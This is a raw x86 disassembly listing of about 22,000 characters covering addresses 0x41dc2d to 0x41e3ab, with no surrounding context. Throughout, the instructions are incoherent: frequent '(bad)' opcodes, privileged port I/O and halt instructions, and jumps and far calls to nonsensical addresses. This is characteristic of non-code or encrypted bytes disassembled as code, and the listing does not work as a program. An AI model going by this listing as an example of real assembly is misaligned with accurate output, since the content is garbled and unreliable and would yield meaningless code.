  41dc2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc2e:	inc    esi
  41dc2f:	mov    esi,0xac1edd3b
  41dc34:	inc    edx
  41dc35:	mov    al,ds:0xa3e64226
  41dc3a:	std    
  41dc3b:	and    DWORD PTR [edi-0x7caf56be],esp
  41dc41:	push   eax
  41dc42:	cdq    
  41dc43:	cli    
  41dc44:	push   ecx
  41dc45:	cmp    BYTE PTR [ecx],al
  41dc47:	add    BYTE PTR [ecx+esi*8],0x9b
  41dc4b:	add    edi,DWORD PTR [esi-0x1b]
  41dc4e:	sbb    dl,BYTE PTR [esi-0x1f]
  41dc51:	nop
  41dc52:	adc    bl,BYTE PTR [esi+0x15fe2303]
  41dc58:	add    eax,0x60863b3e
  41dc5d:	xchg   edi,eax
  41dc5e:	push   ds
  41dc5f:	mov    ebx,DWORD PTR [eax-0x61]
  41dc62:	jmp    0xccdc1109
  41dc67:	clc    
  41dc68:	mov    esp,0x69d08f92
  41dc6d:	xor    bh,BYTE PTR [esi+edx*1+0x62]
  41dc71:	cmp    BYTE PTR [esi-0x60ea9db8],0x45
  41dc78:	dec    ebp
  41dc79:	jns    0x41dcba
  41dc7b:	imul   esp,edi,0xc4e11455
  41dc81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc82:	xor    ecx,esp
  41dc84:	in     al,dx
  41dc85:	lahf   
  41dc86:	retf   0xa2b9
  41dc89:	in     al,dx
  41dc8a:	jmp    0x63fa:0xb9f4900
  41dc91:	ret    
  41dc92:	mov    ah,0x1a
  41dc94:	xchg   esi,eax
  41dc95:	pop    ebp
  41dc96:	push   ds
  41dc97:	add    DWORD PTR [esi+0x6b],eax
  41dc9a:	or     BYTE PTR [ebp+0x6d],al
  41dc9d:	test   BYTE PTR [edx-0x1d62f1d0],ah
  41dca3:	cmp    ah,BYTE PTR [ebx+0xd]
  41dca6:	dec    ecx
  41dca7:	pop    edi
  41dca8:	and    BYTE PTR [bp+di-0x6750],0xeb
  41dcae:	fnsave [edx]
  41dcb0:	xor    BYTE PTR [edx],cl
  41dcb2:	add    edi,ecx
  41dcb4:	inc    esi
  41dcb5:	gs sti 
  41dcb7:	xlat   BYTE PTR ds:[ebx]
  41dcb8:	push   ds
  41dcb9:	ja     0x41dc4c
  41dcbb:	scas   eax,DWORD PTR es:[edi]
  41dcbc:	pushf  
  41dcbd:	sbb    eax,0x6b26b1bb
  41dcc2:	push   ss
  41dcc3:	inc    ebx
  41dcc4:	mov    dh,0x9c
  41dcc6:	push   esi
  41dcc7:	mov    esp,0xdacdc1bc
  41dccc:	(bad)
  41dccf:	or     al,BYTE PTR [esi+ecx*2+0x3f]
  41dcd3:	mov    ah,BYTE PTR [eax+ebx*4]
  41dcd6:	stos   DWORD PTR es:[edi],eax
  41dcd7:	popa   
  41dcd8:	shr    ebx,1
  41dcda:	push   ss
  41dcdb:	xor    BYTE PTR [ebx-0x2cbe91be],cl
  41dce1:	in     al,0xcf
  41dce3:	xchg   esp,eax
  41dce4:	mov    ebp,0x370059be
  41dce9:	xchg   ebp,eax
  41dcea:	and    ch,cl
  41dcec:	enter  0x3071,0xaf
  41dcf0:	sbb    eax,0x776ceea2
  41dcf5:	jae    0x41dce0
  41dcf7:	cmc    
  41dcf8:	jbe    0x41dd62
  41dcfa:	test   DWORD PTR [ebx+0xf],edx
  41dcfd:	sub    dh,ch
  41dcff:	xor    DWORD PTR [edi],ecx
  41dd01:	sbb    dh,ah
  41dd03:	hlt    
  41dd04:	mov    bl,0x60
  41dd06:	retf   
  41dd07:	cmp    edi,DWORD PTR [ebp+0x54]
  41dd0a:	data16 hlt 
  41dd0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd0d:	adc    DWORD PTR [eax-0x48],ecx
  41dd10:	pop    esp
  41dd11:	dec    BYTE PTR [ebx-0xd0d6785]
  41dd17:	sahf   
  41dd18:	and    eax,0xef6d2811
  41dd1d:	rcr    ecx,cl
  41dd1f:	in     eax,dx
  41dd20:	stos   DWORD PTR es:[edi],eax
  41dd21:	pusha  
  41dd22:	mov    al,0x84
  41dd24:	ret    
  41dd25:	sahf   
  41dd26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd27:	aam    0x52
  41dd29:	lahf   
  41dd2a:	sub    DWORD PTR [ebx+ebx*4],esi
  41dd2d:	ins    DWORD PTR es:[edi],dx
  41dd2e:	inc    edi
  41dd2f:	mov    ch,0x2
  41dd31:	xchg   DWORD PTR [ecx],ebp
  41dd33:	pop    ecx
  41dd34:	push   cs
  41dd35:	mov    dl,0x9b
  41dd37:	or     ebx,esp
  41dd39:	cmp    dl,BYTE PTR [eax+0x53]
  41dd3c:	aad    0xe4
  41dd3e:	sbb    ebx,esp
  41dd40:	sub    cl,bh
  41dd42:	arpl   WORD PTR [ebx-0x47],di
  41dd45:	push   0xef8dc9e3
  41dd4a:	jns    0x41dd67
  41dd4c:	push   0x767cda2b
  41dd51:	mul    BYTE PTR [edx]
  41dd53:	inc    ebx
  41dd54:	pop    eax
  41dd55:	xor    eax,0xb3edf43f
  41dd5a:	fld    QWORD PTR [edx+edi*2]
  41dd5d:	scas   eax,DWORD PTR es:[edi]
  41dd5e:	cmc    
  41dd5f:	xchg   ebx,eax
  41dd60:	cmp    ecx,DWORD PTR [ebx-0x1a67b931]
  41dd66:	sbb    ah,0xe1
  41dd69:	inc    ebx
  41dd6a:	mov    ds:0xe81be50f,al
  41dd6f:	jge    0x41dd76
  41dd71:	xor    edx,ecx
  41dd73:	adc    BYTE PTR [edi+0x31cf525c],0x29
  41dd7a:	mov    al,ds:0x9acd2dba
  41dd7f:	(bad)  
  41dd80:	scas   al,BYTE PTR es:[edi]
  41dd81:	call   0x91d59b2f
  41dd86:	arpl   WORD PTR [ebx],bp
  41dd88:	mov    cl,BYTE PTR [edx-0x43007afd]
  41dd8e:	fisubr DWORD PTR [esp+edx*8+0x2c]
  41dd92:	mov    eax,0xdaa7cc97
  41dd97:	cmp    edx,DWORD PTR [edi+0x58]
  41dd9a:	cdq    
  41dd9b:	cs std 
  41dd9d:	or     BYTE PTR [esi],dl
  41dd9f:	mov    al,ds:0xf5f8494d
  41dda4:	mov    eax,ss
  41dda6:	and    eax,0x3cee03df
  41ddab:	popf   
  41ddac:	add    eax,0x39318216
  41ddb1:	pop    es
  41ddb2:	push   0xffffffea
  41ddb4:	add    DWORD PTR [eax+0x71],edi
  41ddb7:	mov    al,ds:0x833a0c33
  41ddbc:	cmc    
  41ddbd:	pop    edx
  41ddbe:	lea    edx,[esi-0x62]
  41ddc1:	or     BYTE PTR [eax],bh
  41ddc3:	inc    esi
  41ddc4:	leave  
  41ddc5:	call   0x899fa579
  41ddca:	fs jb  0x41dda8
  41ddcd:	inc    edi
  41ddce:	int3   
  41ddcf:	xchg   ebx,eax
  41ddd0:	sbb    al,bl
  41ddd2:	out    0xf4,eax
  41ddd4:	in     eax,0x22
  41ddd6:	fwait
  41ddd7:	in     eax,dx
  41ddd8:	and    eax,DWORD PTR [eax+ebx*1-0x2c]
  41dddc:	ja     0x41dd9c
  41ddde:	rol    DWORD PTR [edx+0x2e],1
  41dde1:	add    eax,0x364ea42f
  41dde6:	fnstcw WORD PTR [esp+ecx*8-0x78ca9466]
  41dded:	popa   
  41ddee:	ins    DWORD PTR es:[edi],dx
  41ddef:	ins    BYTE PTR es:[edi],dx
  41ddf0:	xchg   esp,eax
  41ddf1:	xor    DWORD PTR [eax],esi
  41ddf3:	inc    esp
  41ddf4:	imul   ebp,esi,0x10
  41ddf7:	fld    DWORD PTR [ebx+0x18]
  41ddfa:	push   ds
  41ddfb:	mov    gs:0xa1b5dee0,al
  41de01:	es pop ecx
  41de03:	cmp    eax,0xcd069d1d
  41de08:	lods   al,BYTE PTR ds:[esi]
  41de09:	das    
  41de0a:	dec    esp
  41de0b:	push   es
  41de0c:	push   0x5729c6a6
  41de11:	mov    ebp,0xc2a08c34
  41de16:	ret    0x1b79
  41de19:	mov    bp,0xb7b2
  41de1d:	sbb    WORD PTR [ebx],ax
  41de20:	jmp    0x19763755
  41de25:	test   eax,0x22c2686d
  41de2a:	push   ecx
  41de2b:	adc    BYTE PTR [edi],ah
  41de2d:	jmp    0xa234476b
  41de32:	cmp    eax,0x73d7286f
  41de37:	stos   BYTE PTR es:[edi],al
  41de38:	(bad)  
  41de39:	stos   BYTE PTR es:[edi],al
  41de3a:	or     esi,DWORD PTR [ecx-0x22c74c81]
  41de40:	and    al,dl
  41de42:	daa    
  41de43:	add    esp,ebp
  41de45:	push   es
  41de46:	fidiv  WORD PTR [edx+0x54]
  41de49:	loopne 0x41de24
  41de4b:	pop    ebp
  41de4c:	adc    DWORD PTR [ebx],0xffffffba
  41de4f:	lods   eax,DWORD PTR ds:[esi]
  41de50:	jl     0x41de46
  41de52:	push   0xc4aa2110
  41de57:	and    DWORD PTR [edi+0x5d1192d1],edx
  41de5d:	out    0x8f,eax
  41de5f:	lahf   
  41de60:	jmp    0x982485b
  41de65:	(bad)  
  41de66:	fistp  WORD PTR [ebx+0x72]
  41de69:	loopne 0x41deab
  41de6b:	pop    ebp
  41de6c:	mov    edx,0x17ed411a
  41de71:	mov    bh,0x30
  41de73:	(bad)  
  41de74:	fnstsw WORD PTR [esi+0x66]
  41de77:	fcos   
  41de79:	fist   WORD PTR [eax+0x384e3977]
  41de7f:	xchg   esi,eax
  41de80:	outs   dx,DWORD PTR ds:[esi]
  41de81:	inc    eax
  41de82:	loop   0x41def1
  41de84:	mov    dh,0xc9
  41de86:	add    ebx,DWORD PTR [ebx-0x57]
  41de89:	test   eax,0x661d40bb
  41de8e:	or     ebp,DWORD PTR [ecx]
  41de90:	cmp    al,0x86
  41de92:	fs std 
  41de94:	out    dx,al
  41de95:	sbb    al,0x2f
  41de97:	neg    BYTE PTR [edi+0x41]
  41de9a:	or     DWORD PTR [ecx+edx*2+0x6701a309],ecx
  41dea1:	iret   
  41dea2:	jo     0x41de5c
  41dea4:	das    
  41dea5:	and    BYTE PTR [ebx-0x8aee78c],ah
  41deab:	mov    edx,0xe7ce4be9
  41deb0:	inc    ecx
  41deb1:	clc    
  41deb2:	int3   
  41deb3:	outs   dx,DWORD PTR ds:[esi]
  41deb4:	push   ecx
  41deb5:	xor    DWORD PTR [esp+ebp*2+0x23],esi
  41deb9:	rcr    BYTE PTR [ecx+0x5909f925],cl
  41debf:	cli    
  41dec0:	shl    DWORD PTR [edx+eiz*8+0x784c2a9f],0xd7
  41dec8:	mov    ds:0xd9977cef,al
  41decd:	lds    ebp,FWORD PTR [ebp-0x17cf5a06]
  41ded3:	in     eax,0x61
  41ded5:	sub    DWORD PTR [ebp+ebp*4+0x29],edi
  41ded9:	test   BYTE PTR [edi+0x420a830],dl
  41dedf:	xor    DWORD PTR [esi-0x4e194d52],edx
  41dee5:	push   edi
  41dee6:	xchg   esi,eax
  41dee7:	mov    WORD PTR ds:0x2f505317,es
  41deed:	cwde   
  41deee:	fwait
  41deef:	ins    DWORD PTR es:[edi],dx
  41def0:	or     dh,BYTE PTR [ebx]
  41def2:	push   esp
  41def3:	daa    
  41def4:	das    
  41def5:	adc    dl,BYTE PTR [ebp-0x307e2c86]
  41defb:	pop    eax
  41defc:	ja     0x41def2
  41defe:	(bad)  
  41df00:	dec    eax
  41df01:	jg     0x41dea4
  41df03:	fidiv  DWORD PTR [eax]
  41df05:	retf   
  41df06:	jnp    0x41deb5
  41df08:	push   0xffffffd2
  41df0a:	mov    ecx,0xb8f9bf7f
  41df0f:	mov    eax,ds:0xc6703ce5
  41df14:	test   al,0x8c
  41df16:	mov    ebp,0xe6099870
  41df1b:	push   0x1e
  41df1d:	xor    al,0x97
  41df1f:	push   ebx
  41df20:	xchg   DWORD PTR [ebx+0x59],edi
  41df23:	ins    BYTE PTR es:[edi],dx
  41df24:	cwde   
  41df25:	repnz xchg edi,eax
  41df27:	in     al,0x17
  41df29:	mov    dh,0x10
  41df2b:	retf   
  41df2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df2d:	sub    edx,ebx
  41df2f:	push   0xffffffb2
  41df31:	sub    edx,ebx
  41df33:	arpl   WORD PTR [eax+0x468f1599],bp
  41df39:	dec    ebp
  41df3a:	stos   DWORD PTR es:[edi],eax
  41df3b:	fcmovb st,st(2)
  41df3d:	pop    edx
  41df3e:	aad    0xc8
  41df40:	test   DWORD PTR [eax],0xd52b7a98
  41df46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df47:	push   esi
  41df48:	popf   
  41df49:	jmp    0x41df57
  41df4b:	(bad)  
  41df4c:	sub    esi,DWORD PTR [ecx]
  41df4e:	out    dx,al
  41df4f:	push   ebx
  41df50:	je     0x41df48
  41df52:	mov    ah,0xf2
  41df54:	sub    DWORD PTR [esi+eax*8+0x32062d15],0xffffffbb
  41df5c:	push   ecx
  41df5d:	push   esi
  41df5e:	sbb    ah,bh
  41df60:	sub    cl,BYTE PTR [ebx-0x4851d3d9]
  41df66:	stc    
  41df67:	loopne 0x41dfbe
  41df69:	dec    esi
  41df6a:	iret   
  41df6b:	lds    esi,FWORD PTR [esi]
  41df6d:	iret   
  41df6e:	ins    DWORD PTR es:[edi],dx
  41df6f:	pop    esp
  41df70:	pop    ecx
  41df71:	mov    dl,0xae
  41df73:	push   0x10
  41df75:	mov    ebx,0x3413553d
  41df7a:	lahf   
  41df7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df7c:	aad    0xe7
  41df7e:	aas    
  41df7f:	add    eax,ebx
  41df81:	mov    dl,0x2f
  41df83:	add    al,dh
  41df85:	sub    DWORD PTR [eax-0x16],ecx
  41df88:	sbb    al,0xe3
  41df8a:	sbb    BYTE PTR [ebp-0x15],ch
  41df8d:	ret    0x77f
  41df90:	add    edx,DWORD PTR [edi+0x28]
  41df93:	mov    dl,BYTE PTR [eax+0x47b6ee16]
  41df99:	ror    esi,0xd3
  41df9c:	stos   BYTE PTR es:[edi],al
  41df9d:	cmp    eax,0x5356e0b9
  41dfa2:	push   ecx
  41dfa3:	cmp    bh,dh
  41dfa5:	fadd   DWORD PTR [ebx-0x6dd0b15b]
  41dfab:	push   es
  41dfac:	test   esi,esp
  41dfae:	jg     0x41df4a
  41dfb0:	mov    ch,0x45
  41dfb2:	sbb    esi,DWORD PTR [ebp-0x47b92221]
  41dfb8:	mov    al,0xf3
  41dfba:	inc    ebp
  41dfbb:	ror    bl,1
  41dfbd:	sahf   
  41dfbe:	adc    ebx,DWORD PTR [esi+0x3567285a]
  41dfc4:	jo     0x41dfaf
  41dfc6:	inc    ecx
  41dfc7:	popf   
  41dfc8:	sbb    DWORD PTR [ebp+0x3778ac11],0x34
  41dfcf:	mov    al,0xb4
  41dfd1:	xor    DWORD PTR [ebp+0x63],ecx
  41dfd4:	mov    ebp,0x3e0aff0e
  41dfd9:	imul   edi,DWORD PTR [eax+0x6d],0x42
  41dfdd:	push   esp
  41dfde:	mov    ch,dl
  41dfe0:	jno    0x41df82
  41dfe2:	mov    bl,BYTE PTR [edi-0x7a]
  41dfe5:	out    0xad,al
  41dfe7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dfe8:	jle    0x41e01f
  41dfea:	es scas al,BYTE PTR es:[edi]
  41dfec:	(bad)  
  41dfed:	(bad)  
  41dfef:	imul   ebx,DWORD PTR [edi-0x3d],0x57ac1572
  41dff6:	leave  
  41dff7:	aaa    
  41dff8:	xchg   ebx,eax
  41dff9:	fs pop ecx
  41dffb:	cs out 0xd7,eax
  41dffe:	pop    esi
  41dfff:	push   ecx
  41e000:	mov    eax,ds:0x97edbe02
  41e005:	lea    ebp,[esi]
  41e007:	adc    dh,BYTE PTR [esi-0x3d9eaa8d]
  41e00d:	lds    eax,FWORD PTR [edi]
  41e00f:	mov    eax,ds:0xa75efd0
  41e014:	out    dx,al
  41e015:	ds hlt 
  41e017:	sub    eax,0xe4602945
  41e01c:	jg     0x41e053
  41e01e:	imul   eax,ecx,0x4
  41e021:	or     cl,ch
  41e023:	mov    ds:0xfb61b851,al
  41e028:	mov    eax,0x2728f53d
  41e02d:	adc    eax,0x3faeee58
  41e032:	into   
  41e033:	imul   ecx,edx,0xb0eb97b
  41e039:	inc    ebp
  41e03a:	mov    ecx,0x7e00ed10
  41e03f:	jmp    0x41e0be
  41e041:	and    BYTE PTR [edx+0x26],0xc3
  41e045:	loope  0x41e080
  41e047:	and    eax,0x70b28459
  41e04c:	xor    ah,BYTE PTR [ebp+0x24]
  41e04f:	push   ecx
  41e050:	sub    dh,dl
  41e052:	fwait
  41e053:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e054:	leave  
  41e055:	mov    edi,0x17b42a8
  41e05a:	add    al,0x1b
  41e05c:	shl    dl,1
  41e05e:	mov    edi,0x1cf7871b
  41e063:	hlt    
  41e064:	adc    al,0xd0
  41e066:	cmp    DWORD PTR [ebp-0xb090366],esp
  41e06c:	fadd   DWORD PTR [edx+0x71]
  41e06f:	(bad)  
  41e070:	fstp   DWORD PTR [edx+0x4cf234b6]
  41e076:	mov    dl,0x0
  41e078:	loopne 0x41e0dc
  41e07a:	(bad)  
  41e07b:	sti    
  41e07c:	mov    esp,DWORD PTR [ebp-0x743bdca4]
  41e082:	retf   
  41e083:	nop
  41e084:	test   DWORD PTR [ecx-0x2e],edx
  41e087:	pop    eax
  41e088:	add    BYTE PTR [edx+0x34],ah
  41e08b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e08c:	jne    0x41e079
  41e08e:	adc    BYTE PTR [ebp-0x528ec9d9],al
  41e094:	jmp    0x8911f8b
  41e099:	inc    edx
  41e09a:	sub    bh,BYTE PTR [ebx+0x1bcd7d8]
  41e0a0:	mov    bh,BYTE PTR [ebx+0x49]
  41e0a3:	das    
  41e0a4:	gs add al,0x19
  41e0a7:	and    al,0xec
  41e0a9:	or     ebp,eax
  41e0ab:	pop    edi
  41e0ac:	sbb    eax,0x2f8aedca
  41e0b1:	fidiv  DWORD PTR [esi-0x62]
  41e0b4:	lds    ebp,FWORD PTR [edi+0x70]
  41e0b7:	(bad)  
  41e0b9:	leave  
  41e0ba:	fdiv   QWORD PTR [ebx+esi*1+0x71]
  41e0be:	push   0x9d4134aa
  41e0c3:	and    DWORD PTR [esi-0x38],ecx
  41e0c6:	fdivr  st,st(3)
  41e0c8:	xchg   edi,eax
  41e0c9:	iret   
  41e0ca:	xchg   ebp,eax
  41e0cb:	ins    DWORD PTR es:[edi],dx
  41e0cc:	arpl   WORD PTR [ecx],bx
  41e0ce:	jae    0x41e0a6
  41e0d0:	xchg   edx,eax
  41e0d1:	arpl   WORD PTR [edx+edx*8],bx
  41e0d4:	add    al,0x86
  41e0d6:	cmp    DWORD PTR [edx],ebp
  41e0d8:	adc    bl,bh
  41e0da:	and    eax,0x4de5916b
  41e0df:	jp     0x41e0f4
  41e0e1:	fs cmp al,0x96
  41e0e4:	jle    0x41e069
  41e0e6:	jl     0x41e0cc
  41e0e8:	mov    ecx,0xf495f635
  41e0ed:	pop    ebp
  41e0ee:	(bad)  
  41e0ef:	in     al,dx
  41e0f0:	cmp    eax,0xb171be2f
  41e0f5:	out    0xfe,al
  41e0f7:	pushf  
  41e0f8:	push   ebp
  41e0f9:	push   cs
  41e0fa:	es (bad) 
  41e0fc:	popf   
  41e0fd:	fisttp DWORD PTR [esi+0x36]
  41e100:	sar    BYTE PTR [ebp+0x15032b74],cl
  41e106:	push   eax
  41e107:	ds lahf 
  41e109:	jp     0x41e159
  41e10b:	jne    0x41e139
  41e10d:	inc    eax
  41e10e:	mov    bh,0xbd
  41e110:	or     edi,DWORD PTR [edx]
  41e112:	sub    DWORD PTR [edi],0xe5daa563
  41e118:	lds    ebp,FWORD PTR [eax+0x66]
  41e11b:	inc    edx
  41e11c:	loope  0x41e157
  41e11e:	out    dx,al
  41e11f:	out    0x1c,eax
  41e121:	or     edi,DWORD PTR [edi]
  41e123:	out    0xf9,eax
  41e125:	and    eax,0x6ed661a
  41e12a:	jns    0x41e0c6
  41e12c:	test   BYTE PTR [eax-0x1f],dl
  41e12f:	outs   dx,DWORD PTR ds:[esi]
  41e130:	test   eax,0x58c147ce
  41e135:	mov    ds:0x3e5b8a48,eax
  41e13a:	ficom  WORD PTR [ecx+edi*8]
  41e13d:	or     DWORD PTR [edi],edx
  41e13f:	fsub   QWORD PTR [ecx-0x7ef060c]
  41e145:	dec    ebp
  41e146:	mov    dl,0x9b
  41e148:	fneni(8087 only) 
  41e14a:	dec    ecx
  41e14b:	and    bh,bl
  41e14d:	sbb    BYTE PTR [ebp-0x67],0x1b
  41e151:	or     dh,BYTE PTR [esi+0x65cea6cb]
  41e157:	fs mov eax,0xf590f528
  41e15d:	mov    ds:0xe492304b,al
  41e162:	loopne 0x41e1d5
  41e164:	into   
  41e165:	jge    0x41e105
  41e167:	adc    DWORD PTR [ebp-0x6e],esp
  41e16a:	and    DWORD PTR [esi+0x32377fd7],ebp
  41e170:	pop    ebp
  41e171:	and    eax,0x4a1472e3
  41e176:	ins    DWORD PTR es:[edi],dx
  41e177:	jle    0x41e182
  41e179:	in     al,0xae
  41e17b:	pushf  
  41e17c:	ret    0xbbc0
  41e17f:	pop    ds
  41e180:	inc    edi
  41e181:	mov    ecx,0x1188e9a9
  41e186:	addr16 pop edi
  41e188:	mov    ah,0x1e
  41e18a:	add    al,0xfb
  41e18c:	aas    
  41e18d:	or     BYTE PTR ds:0xf89a461e,bl
  41e193:	jecxz  0x41e184
  41e195:	xchg   ebx,eax
  41e196:	jne    0x41e11e
  41e198:	repnz loope 0x41e1a8
  41e19b:	or     eax,0x1854d8aa
  41e1a0:	stos   DWORD PTR es:[edi],eax
  41e1a1:	adc    edi,DWORD PTR [edi-0x7e]
  41e1a4:	mov    eax,ds:0x965db9a3
  41e1a9:	sbb    eax,0xa00f0bad
  41e1ae:	cmp    al,0x88
  41e1b0:	test   eax,edx
  41e1b2:	out    0x76,eax
  41e1b4:	fidivr DWORD PTR [eax+0x71]
  41e1b7:	dec    esi
  41e1b8:	push   ebp
  41e1b9:	test   BYTE PTR [ebp-0x5e286bd6],bh
  41e1bf:	cmp    BYTE PTR [esi],cl
  41e1c1:	mul    DWORD PTR [eax-0x15]
  41e1c4:	loop   0x41e16c
  41e1c6:	sub    eax,0x670c66e7
  41e1cb:	inc    esi
  41e1cc:	cmp    bl,BYTE PTR [edi+0x61]
  41e1cf:	ret    0xfe6
  41e1d2:	jg     0x41e1b6
  41e1d4:	xchg   esi,eax
  41e1d5:	ja     0x41e205
  41e1d7:	lock xor DWORD PTR cs:[esp+ecx*1],0xfffffff0
  41e1dd:	lahf   
  41e1de:	stc    
  41e1df:	call   0xc43c:0x6f25d2a7
  41e1e6:	cmp    dl,bl
  41e1e8:	and    BYTE PTR [eax-0x2b60791a],0xf5
  41e1ef:	pop    eax
  41e1f0:	cmc    
  41e1f1:	loope  0x41e201
  41e1f3:	mov    bl,0xab
  41e1f5:	sub    ecx,ecx
  41e1f7:	into   
  41e1f8:	mov    WORD PTR [ebx],gs
  41e1fa:	scas   al,BYTE PTR es:[edi]
  41e1fb:	mov    al,ds:0x56628f4b
  41e200:	inc    ebp
  41e201:	sub    eax,0xcca67f6d
  41e206:	call   0xc272:0xbcae0603
  41e20d:	aas    
  41e20e:	mov    bh,0xa3
  41e210:	ror    esp,1
  41e212:	push   edx
  41e213:	and    al,0xd3
  41e215:	adc    BYTE PTR [eax],al
  41e217:	jae    0x41e24c
  41e219:	popf   
  41e21a:	(bad)  
  41e21b:	js     0x41e283
  41e21d:	mov    DWORD PTR [eax],esp
  41e21f:	xchg   DWORD PTR [eax],ebx
  41e221:	les    edx,FWORD PTR [ebp-0x4cdf699a]
  41e227:	sub    dh,BYTE PTR [ebp-0x6d]
  41e22a:	psubw  mm2,mm0
  41e22d:	adc    BYTE PTR [esi+0x47],dl
  41e230:	sar    ebx,cl
  41e232:	lahf   
  41e233:	push   0xd646d6e8
  41e238:	xor    ah,BYTE PTR [edi]
  41e23a:	add    al,BYTE PTR [ebx-0x44]
  41e23d:	fist   WORD PTR [ebx-0x1450004d]
  41e243:	int3   
  41e244:	push   ebx
  41e245:	loope  0x41e291
  41e247:	sbb    BYTE PTR [eax-0x5dfd4f95],ch
  41e24d:	iret   
  41e24e:	pop    eax
  41e24f:	rcr    BYTE PTR [ebx],1
  41e251:	lahf   
  41e252:	pop    edi
  41e253:	stc    
  41e254:	int3   
  41e255:	and    ebx,eax
  41e257:	bound  ecx,QWORD PTR ds:0x5419fb3f
  41e25d:	adc    BYTE PTR [eax],dl
  41e25f:	mov    al,0xc6
  41e261:	push   DWORD PTR [ecx-0x7a]
  41e264:	jns    0x41e277
  41e266:	jmpw   0x61c
  41e26a:	jo     0x41e26d
  41e26c:	push   edx
  41e26d:	(bad)  
  41e26e:	push   ecx
  41e26f:	sahf   
  41e270:	stc    
  41e271:	pop    edx
  41e272:	sbb    DWORD PTR [esi+0x79d81c8f],edi
  41e278:	fdivr  QWORD PTR [ecx]
  41e27a:	int3   
  41e27b:	mov    edx,0xfffe2048
  41e280:	add    eax,0x120687cf
  41e285:	fstp   TBYTE PTR [edi]
  41e287:	adc    al,0x5f
  41e289:	(bad)  
  41e28b:	mov    edi,0x71d031b6
  41e290:	fcmovnb st,st(4)
  41e292:	add    DWORD PTR [ebp+0x537df87b],esi
  41e298:	jg     0x41e2a4
  41e29a:	inc    ax
  41e29c:	outs   dx,DWORD PTR ds:[esi]
  41e29d:	xor    eax,0x66e9bfe
  41e2a2:	rol    DWORD PTR [eax+ebp*2],cl
  41e2a5:	aad    0x1b
  41e2a7:	jns    0x41e2c1
  41e2a9:	adc    edx,DWORD PTR [esi]
  41e2ab:	and    al,0x6f
  41e2ad:	inc    esp
  41e2ae:	mov    ecx,0x7a019303
  41e2b3:	in     eax,dx
  41e2b4:	pop    es
  41e2b5:	fcmovnbe st,st(5)
  41e2b7:	mov    eax,0xd1dfbcde
  41e2bc:	mov    dl,0xd0
  41e2be:	cli    
  41e2bf:	ins    BYTE PTR es:[edi],dx
  41e2c0:	dec    esp
  41e2c1:	mov    ds:0x2293bbc0,eax
  41e2c6:	lods   al,BYTE PTR ds:[esi]
  41e2c7:	or     DWORD PTR [ebp-0x7894bdd7],ecx
  41e2cd:	and    DWORD PTR [eax],ebx
  41e2cf:	mov    ebp,DWORD PTR [ebx-0x607967ee]
  41e2d5:	dec    ecx
  41e2d6:	scas   al,BYTE PTR es:[edi]
  41e2d7:	dec    edx
  41e2d8:	cmc    
  41e2d9:	add    al,0x34
  41e2db:	stos   DWORD PTR es:[edi],eax
  41e2dc:	sub    DWORD PTR [edx],ebx
  41e2de:	sbb    DWORD PTR [ecx],esi
  41e2e0:	daa    
  41e2e1:	xchg   DWORD PTR [edi+edx*1+0x38],edi
  41e2e5:	iret   
  41e2e6:	xor    BYTE PTR [ebx],dh
  41e2e8:	fld    TBYTE PTR [esi+ebp*4]
  41e2eb:	(bad)  
  41e2ec:	neg    BYTE PTR [edi+edi*1-0x7]
  41e2f0:	and    esi,DWORD PTR [edi-0x67]
  41e2f3:	stos   BYTE PTR es:[edi],al
  41e2f4:	xchg   esp,eax
  41e2f5:	inc    ebp
  41e2f6:	dec    eax
  41e2f7:	or     esp,DWORD PTR [edi]
  41e2f9:	pop    ds
  41e2fa:	mov    ds:0x7def65fc,eax
  41e2ff:	mov    bh,0xe6
  41e301:	sar    DWORD PTR [edi+0x25aeaf38],1
  41e307:	gs ja  0x41e2f4
  41e30a:	stc    
  41e30b:	es call 0x4a440d89
  41e311:	retf   
  41e312:	sub    eax,0xffffffd5
  41e315:	lock cld 
  41e317:	fs iret 
  41e319:	push   es
  41e31a:	push   esp
  41e31b:	arpl   WORD PTR ds:0xfcd5c8c1,cx
  41e321:	lock or eax,0x6371faa9
  41e327:	inc    ebx
  41e328:	inc    edi
  41e329:	(bad)  
  41e32b:	xor    eax,0x48b941cd
  41e330:	dec    ebp
  41e331:	cmp    ah,BYTE PTR [ebx-0x2b]
  41e334:	es pusha 
  41e336:	dec    ebx
  41e337:	and    BYTE PTR [ebp-0x16],0x28
  41e33b:	push   es
  41e33c:	(bad)
  41e340:	inc    ebx
  41e341:	pop    eax
  41e342:	jno    0x41e3c1
  41e344:	jp     0x41e2de
  41e346:	push   0xb38b23f3
  41e34b:	push   es
  41e34c:	scas   al,BYTE PTR es:[edi]
  41e34d:	adc    al,0x6a
  41e34f:	cld    
  41e350:	sub    al,0x69
  41e352:	push   ecx
  41e353:	adc    al,0x66
  41e355:	push   0xed5ce7e3
  41e35a:	dec    eax
  41e35b:	push   esi
  41e35c:	cs sbb al,0x4d
  41e35f:	in     al,dx
  41e360:	xor    BYTE PTR [esi+0x11],0xb3
  41e364:	add    al,0x69
  41e366:	int3   
  41e367:	das    
  41e368:	test   DWORD PTR [edi],0x14974510
  41e36e:	jle    0x41e37e
  41e370:	(bad)  
  41e371:	mov    eax,0x392bc1bd
  41e376:	push   ss
  41e377:	mov    edi,0x14810ad3
  41e37c:	sub    DWORD PTR [ecx],ebp
  41e37e:	jp     0x41e393
  41e380:	mov    al,0x41
  41e382:	pop    es
  41e383:	jnp    0x41e3ed
  41e385:	fdiv   DWORD PTR [ebx-0x188f620b]
  41e38b:	mov    eax,0x33234735
  41e390:	jno    0x41e3ec
  41e392:	mov    edi,0x593bf556
  41e397:	ins    BYTE PTR es:[edi],dx
  41e398:	jmp    0x9aa9ad92
  41e39d:	adc    eax,0x5bff4a9f
  41e3a2:	nop
  41e3a3:	and    DWORD PTR [esi+0x2837162],0x25
  41e3aa:	inc    ecx
  41e3ab:	xchg   ebp,eax
